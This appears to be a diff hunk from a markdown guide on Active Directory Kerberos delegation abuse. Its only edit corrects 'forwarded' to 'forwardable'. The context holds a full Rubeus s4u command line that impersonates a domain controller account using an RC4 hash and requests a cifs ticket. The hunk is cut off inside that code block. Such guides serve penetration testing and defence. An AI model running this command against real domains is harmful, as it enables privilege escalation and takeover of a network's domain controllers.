@@ -220,7 +220,7 @@ describeTicket.py dc01$.ccache
 
 ### Constrained delegation with Protocol Transition:
 
-This method of delegation abuse is a classic method of exploitation, the TGS ticket is forwarded and can completely go through the s4u2self and s4u2proxy chain.
+This method of delegation abuse is a classic method of exploitation, the TGS ticket is forwardable and can completely go through the s4u2self and s4u2proxy chain.
 
 ```
 execute-assembly /tmp/Rubeus.exe s4u /impersonateuser:DC01 /msdsspn:time/dc.domain.ru /user:jaki_pc /rc4:fcb5ae2b5e8c05d7a938bbe8649e4a44 /altservice:cifs/dc.domain.ru /nowrap – convenient for .kirbi export
